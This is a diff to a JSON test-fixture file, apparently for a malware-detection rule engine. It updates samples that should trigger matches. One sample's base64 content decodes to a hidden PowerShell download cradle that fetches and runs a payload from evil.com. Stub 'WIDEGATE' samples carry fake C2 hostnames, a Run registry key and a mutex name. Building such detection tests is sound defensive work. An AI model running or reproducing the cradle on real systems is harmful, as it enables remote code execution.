@@ -356,10 +356,10 @@
               },
               {
                 "name": "encoded_cradle.ps1",
-                "content": "cG93ZXJzaGVsbC5leGUgLW5vcCAtdyBoaWRkZW4gLWVuYyBhV1Y0SUNod1lYbHNiMkZrS1E9PQ==",
+                "content": "IyBQb3dlclNoZWxsIGVuY29kZWQgY29tbWFuZCBsb2FkZXIKJGNtZCA9ICdpZXggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoImh0dHA6Ly9ldmlsLmNvbS9wYXlsb2FkIiknCnBvd2Vyc2hlbGwuZXhlIC1ub3AgLXcgaGlkZGVuIC1lbmMgJChbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtUZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygkY21kKSkp",
                 "shouldMatch": true,
-                "description": "Encoded PowerShell cradle with -nop -w hidden -enc flags — classic obfuscated downloader.",
-                "previewStrings": ["powershell.exe", "-nop", "-w hidden", "-enc"]
+                "description": "PowerShell encoded command loader: builds a downloader command with iex, Net.WebClient, and DownloadString, then executes via -enc flag.",
+                "previewStrings": ["iex", "Net.WebClient", "DownloadString", "-enc"]
               },
               {
                 "name": "legit_admin.ps1",
@@ -486,19 +486,19 @@
             "samples": [
               {
                 "name": "widegate_sample.bin",
-                "content": "TVqQAAMAAAAEAAAAYgBhAGQAYQBjAHQAbwByADMALgBjAG8AbQAvAGcAYQB0AGUAAABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABSAHUAbgAAAFdJREVHQVRFX01UWA==",
+                "content": "TVqQAAMAAAAEAAAAYmFkYWN0b3IzLmNvbS9nYXRlAGIAYQBkAGEAYwB0AG8AcgAzAC4AYwBvAG0ALwBnAGEAdABlAAAAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4AAABXSURFR0FURV9NVFg=",
                 "shouldMatch": true,
-                "description": "WIDEGATE malware binary: contains wide-char C2 URL (badactor3.com), wide-char registry Run key, and WIDEGATE_MTX mutex.",
-                "previewStrings": ["WIDEGATE_MTX"],
-                "previewHex": "62 00 61 00 64 00 61 00 63 00 74 00 6F 00 72 00 33 00 2E 00 63 00 6F 00 6D 00"
+                "description": "WIDEGATE malware binary: contains C2 URL (badactor3.com) in both ASCII and wide encoding, wide-char registry Run key, and WIDEGATE_MTX mutex.",
+                "previewStrings": ["badactor3.com", "WIDEGATE_MTX", "CurrentVersion\\Run"],
+                "previewHex": "62 61 64 61 63 74 6F 72 33 2E 63 6F 6D"
               },
               {
                 "name": "widegate_variant.bin",
-                "content": "TVqQAAMAAAAEAAAAYgBhAGQAYQBjAHQAbwByADEAMgAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAAAFdJREVHQVRFX01UWAAAAFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1bg==",
+                "content": "TVqQAAMAAAAEAAAAYmFkYWN0b3IxMi5jb20vcGF5bG9hZABiAGEAZABhAGMAdABvAHIAMQAyAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAAAAV0lERUdBVEVfTVRYAFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1bg==",
                 "shouldMatch": true,
-                "description": "WIDEGATE variant: different C2 subdomain (badactor12.com), contains mutex and ASCII registry path.",
-                "previewStrings": ["WIDEGATE_MTX", "badactor12.com"],
-                "previewHex": "62 00 61 00 64 00 61 00 63 00 74 00 6F 00 72 00 31 00 32 00"
+                "description": "WIDEGATE variant: different C2 subdomain (badactor12.com) in ASCII and wide encoding, mutex and ASCII registry path.",
+                "previewStrings": ["badactor12.com", "WIDEGATE_MTX", "CurrentVersion\\Run"],
+                "previewHex": "62 61 64 61 63 74 6F 72 31 32 2E 63 6F 6D"
               },
               {
                 "name": "legit_svchost.exe",
